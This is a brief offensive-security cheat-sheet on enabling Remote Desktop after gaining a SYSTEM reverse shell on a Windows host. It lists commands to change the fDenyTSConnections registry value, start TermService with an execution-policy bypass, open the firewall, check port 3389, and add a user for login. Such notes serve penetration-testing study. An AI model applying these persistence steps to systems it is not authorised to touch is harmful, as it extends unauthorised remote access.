# Enabling RDP

### RDP&#x20;

We have a reverse-shell (e.g., netcat) as SYSTEM.

```bash
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
```

We start the RDP Service:

```bash
powershell -ep bypass -c "Start-Service TermService"
```

We verify it's actually running:

```bash
powershell -ep bypass -c "Get-Service TermService"
```

We add a firewall rule :

```bash
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

We verify port is actually listening:

```bash
netstat -ano | findstr :3389
```

We can continue by adding a user of our choice to "Remote Desktop Users" localgroup and then login.
